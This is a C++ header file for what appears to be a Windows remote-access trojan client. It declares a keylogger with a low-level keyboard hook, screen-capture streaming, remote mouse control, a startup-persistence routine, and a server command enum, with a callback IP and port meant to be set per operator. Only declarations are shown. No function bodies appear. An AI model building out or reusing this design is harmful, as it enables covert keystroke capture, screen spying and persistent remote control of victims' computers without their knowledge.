#define _WIN32_WINNT 0x0500
#include <iostream>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <map>
#include <string>
#include <Shlwapi.h> //NOTE LINKER SETTINGS: -lShlwapi
#include <process.h>
#include <sstream>
#include <ctime>
#include <cmath>
#include <zlib.h>

#pragma pack(1)

//NOTE, should we leave it as preprocessor definitions? Or go the "correct" way and use const variables? Its your choice.
#define IP_ADDR "127.0.0.1" //THIS VARIABLE WILL BE CHANGED AS THE CLIENT PROGRAM IS TAILORED TO THE USER'S SETTINGS.
#define PORTNO 80 //THIS VARIABLE WILL BE CHANGED AS CLIENT PROGRAM IS TAILORED TO THE USER'S SETTINGS
#define PROGRAM_NAME "fuck.exe" //THIS WILL BE THE PROGRAM FILE NAME

//functions used to multithread.
unsigned int __stdcall TrigBox(void*);
unsigned int __stdcall KeyLog(void*);
unsigned int __stdcall StreamPict(void*);

//normal functions
LRESULT CALLBACK LowLevelKeyboardProc(int, WPARAM, LPARAM);
void AddtoStartup();
int HandleError(int);
//namespace declarations
using std::string;
using std::map;
using std::stringstream;

//enumerate server messages so we can process them!
enum SERVERMESSAGE {TRIGMSGBOX, KEYLOG, STOPKEYLOG,DISCONNECT, STREAMPICT, MOVMOUSECLK, STOPSTREAM}; //ENUMERATE SERVER COMMANDS, 0 = MESSAGE1, 1 = MESSAGE2

//map the c-style strings to each enumeration or UINT type for our fes.
extern map<string, SERVERMESSAGE> dictionary;
extern map<string, UINT> MSGBOX_TYPES;
extern map<string, UINT> MSGBOX_ICONS;

const int buffersize = 5000;

extern unsigned int KEYLOG_ID;

extern string server_operator;
extern string server_operand;
extern string ipaddress;


extern int portnumber;

extern WSADATA wsa;
extern SOCKET sa, clientsock;
extern struct sockaddr_in server, client;
extern char server_reply[buffersize];
//THIS BOOLEAN VALUE WILL MAKE THE SERVER KEEP WORKING. CAN BE DISABLED FROM CLIENT.
extern bool KILLSERVER , stream_is_true ;

typedef struct IMAGE_PKT_HEADER{

    //make sure to ntohl the ints.
    int screen_ratio;
    BITMAPINFOHEADER bitmaphdr;
    int packet_expected;
    int origx, origy;
    ULONG uncompressed_size; //uncompressed
    ULONG compressed_Size; //compressed

}IMAGE_PKT_HEADER;

typedef struct PKT{

    char command[12];
    unsigned char data[4096];

}PKT;




    //PKT *pak, *PACKETS;



